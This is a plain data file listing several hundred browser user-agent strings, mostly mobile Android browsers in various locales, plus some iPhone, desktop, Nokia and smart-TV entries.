'Mozilla/5.0 (Linux; U; Android 5.1.1; ar-SAU; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; ar-SAU; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SAU; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SAU; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SAU; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SAU; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; ar-SAU; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 7.0; en-US; E2 Noir Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-US; Lenovo A7020a48 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0; en-US; Lenovo K50a40 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1; en-US; V85 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-us; Redmi Note 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.7.7'
'Mozilla/5.0 (Linux; U; Android 7.1.1; zh-cn; vivo X9 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.9 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 7.0; id-ID; E2 Noir Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; id-ID; Lenovo A7020a48 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0; id-ID; Lenovo K50a40 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1; id-ID; V85 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; id-ID; Redmi Note 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.7.7'
'Mozilla/5.0 (Linux; U; Android 7.1.1; id-ID; vivo X9 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.9 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 7.0; en-us; E2 Noir Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-us; Lenovo A7020a48 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0; enus; Lenovo K50a40 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1; en-us; V85 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-us; Redmi Note 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.7.7'
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-us; vivo X9 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.9 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 7.0; en-BD; E2 Noir Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-BD; Lenovo A7020a48 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0; en-BD; Lenovo K50a40 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1; en-BD; V85 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-BD; Redmi Note 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.7.7'
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-BD; vivo X9 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.9 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 7.0; en-PK; E2 Noir Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-PK; Lenovo A7020a48 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0; en-PK; Lenovo K50a40 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1; en-PK; V85 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-PK; Redmi Note 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.7.7'
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-PK; vivo X9 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.9 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 7.0; en-IN; E2 Noir Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-IN; Lenovo A7020a48 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0; en-IN; Lenovo K50a40 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1; en-IN; V85 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; en-IN; Redmi Note 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.7.7'
'Mozilla/5.0 (Linux; U; Android 7.1.1; en-IN; vivo X9 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.9 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 7.0; ar-SA; E2 Noir Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; ar-SA; Lenovo A7020a48 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0; ar-SA; Lenovo K50a40 Build/MRA58K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1; ar-SA; V85 Build/LMY47D) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0; ar-SA; Redmi Note 4 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/8.7.7'
'Mozilla/5.0 (Linux; U; Android 7.1.1; ar-SA; vivo X9 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko)Version/4.0 Chrome/37.0.0.0 MQQBrowser/7.9 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.73 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0.1; SM-J700F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 4.4.2; S55 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N9005/N9005XXSGBQA1 Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-N920S Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0.1; SAMSUNG SM-N915FY Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G928L Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/6.2 Chrome/56.0.2924.87 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 5.0.2; SM-A500F Build/LRX22G; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 bdbrowser/6.4.0.4'
'Mozilla/5.0 (Linux; Android 7.0; SM-G920F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/62.0.3202.84 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/148.0.0.51.62;]'
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532F Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.73 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.73 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0; Redmi Note 4X Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A536 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.73 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 5.1.1; Lenovo A2020a40 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.73 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 5.1.1; vivo X7Plus Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/38.0.2125.102 Mobile Safari/537.36 VivoBrowser/5.2.21'
'Mozilla/5.0 (Linux; Android 4.4.4; vivo Y27 Build/KTU84P; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/48.0.2564.116 Mobile Safari/537.36 T7/9.3 baiduboxapp/9.3.5.11 (Baidu; P1 4.4.4)'
'Mozilla/5.0 (Linux; Android 7.0; Infinix HOT 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Mobile Safari/537.36'
'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_1 like Mac OS X) AppleWebKit/601.1 (KHTML, like Gecko) CriOS/62.0.3202.70 Mobile/13E238 Safari/601.1.46'
'Mozilla/5.0 (iPhone; CPU iPhone OS 11_1 like Mac OS X) AppleWebKit/603.1.30 (KHTML, like Gecko) CriOS/61.0.3163.73 Mobile/15B93 Safari/602.1'
'Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5X Build/OPR4.170623.009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.1.1; TA-1021 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 8.0.0; Pixel Build/OPR3.170623.008) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.0; VIE-L29 Build/HUAWEIVIE-L29) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 8.0.0; G8141 Build/47.1.A.3.254) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36'
'Mozilla/5.0 (X11; U; Linux x86_64; en-PK) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.114 Safari/537.36 Puffin/5.2.2IP'
'Mozilla/5.0 (Linux; Android 6.0; CPH1609 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.73 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0; LG-H525 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.98 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.0; Micromax Q402Plus Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36'
'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+'
'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 10; SM-G996U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 10; SM-G980F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.96 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0.1; SM-G532M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.0; Pixel C Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/52.0.2743.98 Safari/537.36'
'NokiaC5-00/061.005 (SymbianOS/9.3; U; Series60/3.2 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 Safari/525 3gpp-gba'
'Mozilla/5.0 (Linux; Tizen 2.3; SmartHub; SMART-TV; SmartTV; U; Maple2012) AppleWebKit/538.1+ (KHTML, like Gecko) TV Safari/538.1+'
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
'Opera/9.80 (Android; Opera Mini/13.0/75.35; U; en) Presto/2.12 Version/12.16'
'Opera/9.80 (Android; Opera Mini/22.0/75.35; U; pt) Presto/2.12 Version/12.16'
'Opera/9.80 (Android; Opera Mini/24.0/75.35; U; id) Presto/2.12 Version/12.16'
'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 UBrowser/6.2.3831.3 Safari/537.36'
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3257.0 Safari/537.36'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.102 Safari/537.36 Vivaldi/1.93.955.48'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.30 Safari/537.36'
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.75 Safari/537.36'
'Mozilla/5.0 (Android 8.0.0; Mobile; rv:45.0) Gecko/45.0 Firefox/45.0'
'Mozilla/4.1 (compatible; MSIE 5.0; Symbian OS; Nokia 7610;451) Opera 6.20'
'Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.92 Mobile Safari/537.36'
'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.4 Mobile/15E148 Safari/604.1 ;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]'
'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/102.0 Mobile/15E148 Safari/605.1.15 [FBAN/FBIOS;FBDV/iPhone12,1;FBMD/iPhone;FBSN/iOS;FBSV/13.4.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5]'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
'Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 11; Nokia 3.2) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/98.0.4758.87 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12'
'Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 2.3.4; pt-pt; SonyEricssonLT18a Build/4.0.1.A.0.266) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 2.3.4; ru-ru; MID Build/GRJ22) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1'
'Mozilla/5.0 (Linux; U; Android 4.2; ru-ru; Nokia_X Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.2 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 4.2.1; ru-ru; 9930i Build/JOP40D) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 4.2.2; ru-ru; Fly IQ4404 Build/JDQ39) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 YandexSearch/7.16'
'Mozilla/5.0 (Linux; U; Android 4.3; en-us; ASUS_T00J Build/JSS15Q) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36'
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:59.0) Gecko/20100101 Firefox/59.09'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-US; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-US; ASUS_A007 Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-us; SM-E500H Build/LMY47X) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 5.1.1; en-us; SM-T285 Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-us; SM-G900H Build/MMB29K) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.4.8.1012 (SpeedMode) U4/1.0 UCWEB/2.0 Mobile Safari/534.30'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-us; SM-G5520 Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
'Mozilla/5.0 (Linux; U; Android 6.0.1; en-us; SM-A700FD Build/MMB29M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.4.8.1012 Mobile Safari/537.36'
